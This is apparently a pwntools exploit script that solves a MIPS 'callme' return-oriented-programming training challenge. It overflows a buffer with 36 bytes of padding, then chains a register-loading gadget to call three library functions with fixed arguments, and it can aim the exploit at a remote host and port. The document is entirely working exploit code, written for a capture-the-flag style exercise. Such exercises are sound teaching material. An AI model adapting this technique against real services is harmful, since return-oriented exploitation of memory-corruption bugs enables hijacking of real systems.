from pwn import *

splash()
elf = context.binary = ELF("./callme_mipsel")


class ROP:
    load_args = 0x00400bb0  # lw $a0, 0x10($sp); lw $a1, 0xc($sp); lw $a2, 8($sp); lw $t9, 4($sp); jalr $t9; nop;


def conn():
    if args.LOCAL:
        pty = process.PTY
        return process(elf.path, stdin=pty, stdout=pty, stderr=pty)
    elif args.GDB:
        return gdb.debug(elf.path)
    else:
        return remote(args.HOST, args.PORT)

def solve():
    io = conn()

    padding = cyclic(36)

    payload = [
        padding,
        ROP.load_args,
        0xAAAAAAAA,
        elf.plt.callme_one,
        0xd00df00d,
        0xcafebabe,
        0xdeadbeef,
        ROP.load_args,
        0xAAAAAAAA,
        elf.plt.callme_two,
        0xd00df00d,
        0xcafebabe,
        0xdeadbeef,
        ROP.load_args,
        0xAAAAAAAA,
        elf.plt.callme_three,
        0xd00df00d,
        0xcafebabe,
        0xdeadbeef,
    ]

    io.sendline(flat(payload))
    io.interactive()


if __name__ == "__main__":
    solve()